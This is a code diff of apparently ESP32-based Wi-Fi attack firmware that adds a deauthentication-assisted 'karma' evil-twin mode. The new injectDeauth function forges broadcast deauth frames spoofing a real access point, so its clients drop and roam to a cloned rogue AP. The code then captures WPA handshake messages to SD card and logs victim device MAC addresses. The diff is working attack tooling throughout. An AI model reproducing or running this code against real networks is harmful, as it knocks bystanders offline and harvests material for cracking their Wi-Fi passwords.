@@ -1020,7 +1020,7 @@ static void autoLogConnect(const char* ssid, const uint8_t* sta) {
 // target==nullptr → HARVEST phase; else BAIT phase (st carries the live stage counters).
 // rotPage is used only in HARVEST (auto-scrolls the list); in BAIT the page follows the target.
 static void autoDrawTable(const char* target, uint32_t remainMs, int idx, int total,
-                          int caps, const roguehs::State* st, int rotPage) {
+                          int caps, const roguehs::State* st, int rotPage, bool deauthing) {
     DisplayManager& dm = displayManager;
     if (dm.isBlocked()) return;
 
@@ -1043,9 +1043,8 @@ static void autoDrawTable(const char* target, uint32_t remainMs, int idx, int to
     char b[52];
     if (target && *target) {
         const char* m2 = (st && st->gotM2) ? "YES" : "no";
-        snprintf(b, sizeof(b), "BAIT %d/%d %lus Asc:%lu M1:%lu M2:%s", idx, total,
-                 (unsigned long)(remainMs / 1000), st ? (unsigned long)st->assocs : 0,
-                 st ? (unsigned long)st->m1Sent : 0, m2);
+        snprintf(b, sizeof(b), "BAIT%s %d/%d %lus Asc:%lu M2:%s", deauthing ? "+D" : "", idx, total,
+                 (unsigned long)(remainMs / 1000), st ? (unsigned long)st->assocs : 0, m2);
         dm.setTextColor(st && st->gotM2 ? TFT_GREEN : TFT_YELLOW);
     } else {
         snprintf(b, sizeof(b), "HARVEST %lus  SSIDs:%d  Caps:%d",
@@ -1137,7 +1136,20 @@ static void autoShowCaptured() {
     }
 }
 
-static void karmaAuto() {
+// Broadcast deauth (src = real AP) so its clients drop + re-scan and hit our clone.
+static void injectDeauth(const uint8_t* apBssid) {
+    uint8_t f[26] = {0};
+    f[0] = 0xC0;                               // mgmt, subtype 12 = deauth
+    memset(f + 4, 0xFF, 6);                    // DA = broadcast
+    memcpy(f + 10, apBssid, 6);                // SA  = real AP
+    memcpy(f + 16, apBssid, 6);                // BSSID = real AP
+    f[24] = 0x07;                              // reason 7
+    esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), false);
+}
+
+// deauth=true (km auto deauth): scan for each target's real AP and deauth its clients
+// on its channel during the bait, so connected devices drop + roam to our clone.
+static void karmaAuto(bool deauth) {
     DisplayManager& dm = displayManager;
     if (!ensureBuffers()) {
         freeBuffers();
@@ -1165,9 +1177,9 @@ static void karmaAuto() {
                 rotPage = (rotPage + 1) % tp; lastPage = now; lastDraw = 0;
             }
             if (LockScreenManager::getInstance().consumeJustUnlocked()) lastDraw = 0;
-            if (now - lastDraw > 400) { autoDrawTable(nullptr, KM_AUTO_HARVEST_MS - (now - t0), 0, 0, caps, nullptr, rotPage); lastDraw = now; }
+            if (now - lastDraw > 400) { autoDrawTable(nullptr, KM_AUTO_HARVEST_MS - (now - t0), 0, 0, caps, nullptr, rotPage, false); lastDraw = now; }
             char k = inputHandler.getKeyboardInput();
-            if (k == 'q' || k == 'Q') quit = true;
+            if (k == 'q' || k == 'Q') { quit = true; break; }
             else if (k == 'v' || k == 'V') { autoShowCaptured(); lastDraw = 0; }
             vTaskDelay(pdMS_TO_TICKS(10));
         }
@@ -1195,38 +1207,66 @@ static void karmaAuto() {
             idx[b + 1] = key;
         }
         int total = m < KM_AUTO_TOP ? m : KM_AUTO_TOP;
+
+        // deauth-assist: resolve each target's real AP (BSSID+channel) via one scan,
+        // done HERE while promiscuous is off (post-harvestStop) and before the engine is up.
+        struct RealAp { uint8_t bssid[6]; uint8_t ch; bool found; } realT[KM_AUTO_TOP];
+        for (int i = 0; i < total; i++) realT[i].found = false;
+        if (deauth) {
+            dm.clearScreen(); dm.setCursor(4, outputY); dm.setTextColor(TFT_CYAN);
+            dm.println("Scanning for real APs...");
+            int sc = WiFi.scanNetworks();
+            for (int i = 0; i < total; i++) {
+                for (int k = 0; k < sc; k++) {
+                    if (WiFi.SSID(k).equals(s_nets[idx[i]].ssid)) {
+                        memcpy(realT[i].bssid, WiFi.BSSID(k), 6);
+                        realT[i].ch = (uint8_t)WiFi.channel(k);
+                        realT[i].found = true;
+                        break;
+                    }
+                }
+            }
+            WiFi.scanDelete();
+        }
+
+        bool engineUp = false;
         for (int i = 0; i < total && !quit; i++) {
             int ni = idx[i];
             char target[33]; strncpy(target, s_nets[ni].ssid, 32); target[32] = '\0';
             s_nets[ni].lastBaitMs = millis();                         // mark baited (rotation)
-            if (!roguehs::begin(target, KM_AUTO_BAIT_CH)) continue;
-            uint32_t t0b = millis(), lastDraw = 0;
+            bool dz = deauth && realT[i].found;                       // deauthing this target?
+            uint8_t baitCh = dz ? realT[i].ch : KM_AUTO_BAIT_CH;      // sit on the real AP's channel
+            // Bring the AP up ONCE per sweep, then just retarget — no per-target WiFi churn.
+            if (!engineUp) { if (!roguehs::begin(target, baitCh)) continue; engineUp = true; }
+            else           { roguehs::retarget(target, baitCh); }
+            uint32_t t0b = millis(), lastDraw = 0, lastDeauth = 0;
             while (!quit) {
                 roguehs::poll();
                 const roguehs::State& st = roguehs::state();
                 uint32_t now = millis();
                 if (st.gotM2) break;                                  // captured → next target
                 if (now - t0b >= KM_AUTO_BAIT_MS) break;              // timed out → next target
+                if (dz && now - lastDeauth > 600) {                  // kick the real AP's clients
+                    injectDeauth(realT[i].bssid); injectDeauth(realT[i].bssid); lastDeauth = now;
+                }
                 if (LockScreenManager::getInstance().consumeJustUnlocked()) lastDraw = 0;
-                if (now - lastDraw > 300) { autoDrawTable(target, KM_AUTO_BAIT_MS - (now - t0b), i + 1, total, caps, &st, 0); lastDraw = now; }
+                if (now - lastDraw > 300) { autoDrawTable(target, KM_AUTO_BAIT_MS - (now - t0b), i + 1, total, caps, &st, 0, dz); lastDraw = now; }
                 char k = inputHandler.getKeyboardInput();
-                if (k == 'q' || k == 'Q') quit = true;
+                if (k == 'q' || k == 'Q') { quit = true; break; }
                 else if (k == 'v' || k == 'V') {            // view captured; don't penalize bait timer
                     uint32_t vs = millis(); autoShowCaptured(); t0b += millis() - vs; lastDraw = 0;
                 }
                 vTaskDelay(pdMS_TO_TICKS(5));
             }
-            bool m2 = roguehs::state().gotM2;
-            roguehs::end();                                           // AP down → SD safe
-            delay(30);
-            if (m2) {                                                // state() still valid post-end
+            if (roguehs::state().gotM2) {                            // GDMA: pause promiscuous for the SD write
                 const roguehs::State& s = roguehs::state();
-                karmaSaveCap(target, s, nullptr, 0);
-                autoLogConnect(target, s.staMac);
+                { ScopedPromiscPause _; karmaSaveCap(target, s, nullptr, 0); autoLogConnect(target, s.staMac); }
                 s_nets[ni].captured = true;                           // skip it from now on
                 caps++;
             }
         }
+        if (engineUp) roguehs::end();                                 // one teardown per sweep
+        delay(30);
         // loop back to harvest (continuous) until [q]
     }
 
@@ -1253,7 +1293,9 @@ void runKarma(char* args) {
         char a[96]; strncpy(a, args, sizeof(a) - 1); a[sizeof(a) - 1] = '\0';
         char* tok = strtok(a, " ");
         if (tok && (strcasecmp(tok, "auto") == 0 || strcasecmp(tok, "a") == 0)) {
-            karmaAuto();
+            char* d = strtok(nullptr, " ");
+            bool deauth = d && (strcasecmp(d, "deauth") == 0 || strcasecmp(d, "d") == 0);
+            karmaAuto(deauth);
             return;
         }
         if (tok && strcasecmp(tok, "hs") == 0) {
